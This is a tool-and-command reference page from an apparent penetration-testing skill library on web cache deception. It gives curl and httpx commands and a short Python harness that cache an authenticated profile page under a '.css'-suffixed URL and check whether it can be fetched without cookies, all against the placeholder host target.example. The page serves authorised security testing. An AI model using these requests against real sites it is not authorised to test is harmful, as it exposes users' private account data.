# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`web-cache-poisoning-and-deception-deception-and-path`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -b victim.txt -D - 'https://target.example/account/profile/wcd.css?cb=wcd-aaaa'` | Store the authenticated profile under the suffixed, cacheable-looking key with a test-account session | Cross-platform |
| `curl` | `curl -sS 'https://target.example/account/profile/wcd.css?cb=wcd-aaaa'` | Retrieve the suffixed URL with no cookies to check whether private content was cached | Cross-platform |
| `Burp Suite Repeater` | `Compare /account/profile and /account/profile/x.css for identical private bodies and cache headers` | Confirm the origin ignores the suffix while the edge stores the response | Cross-platform |
| `httpx` | `httpx -u https://target.example -path '/account/profile/x.css' -status-code -include-response-header` | Check the cache-status and content type the suffixed path returns | Linux, Windows, macOS |

## Minimal Script Shape

A deception harness: it stores the suffixed profile with a test-account cookie, retrieves it with no cookie, and reports whether a private marker leaked from cache.

```python
import urllib.request

URL = 'https://target.example/account/profile/wcd.css?cb=wcd-aaaa'
PRIVATE_MARKER = 'account-email:'

def fetch(cookie=None):
    headers = {'User-Agent': 'authorised-assessment'}
    if cookie:
        headers['Cookie'] = cookie
    r = urllib.request.Request(URL, headers=headers)
    with urllib.request.urlopen(r, timeout=10) as resp:
        body = resp.read().decode('utf-8', 'replace')
        return resp.headers.get('X-Cache', ''), (PRIVATE_MARKER in body)

store = fetch(cookie='session=<victim-test-account>')
retrieve = fetch(cookie=None)
print({'store': store, 'unauth_retrieve': retrieve,
       'deception': retrieve[1]})
```
